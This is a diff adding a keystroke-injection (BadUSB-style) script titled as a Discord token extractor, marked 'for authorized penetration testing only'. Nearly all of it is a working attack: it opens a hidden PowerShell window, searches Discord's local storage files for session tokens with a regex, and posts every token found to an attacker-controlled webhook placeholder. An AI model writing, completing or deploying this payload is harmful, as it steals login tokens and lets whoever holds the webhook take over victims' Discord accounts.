@@ -1,0 +1,9 @@
+REM ============================================
+REM Discord Token Extractor -> Discord Webhook
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "$paths=@($env:APPDATA+'\Discord\Local Storage\leveldb',$env:APPDATA+'\discordcanary\Local Storage\leveldb',$env:APPDATA+'\discordptb\Local Storage\leveldb',$env:LOCALAPPDATA+'\Discord');$tokens=@();foreach($p in $paths){if(Test-Path $p){Get-ChildItem $p -Recurse -Include *.log,*.ldb -ErrorAction SilentlyContinue | ForEach-Object{$content=Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;if($content){[regex]::Matches($content,'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}') | ForEach-Object{$tokens+=$_.Value}}}};$tokens=$tokens|Where-Object{$_}|Get-Unique;if($tokens.Count -gt 0){$w='YOUR_DISCORD_WEBHOOK_URL';foreach($t in $tokens){$body=@{content=('Token: '+$t+'`nUser check: https://discord.com/api/v9/users/@me')}|ConvertTo-Json -Depth 5 -Compress;Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $body;Start-Sleep -Milliseconds 500}}"
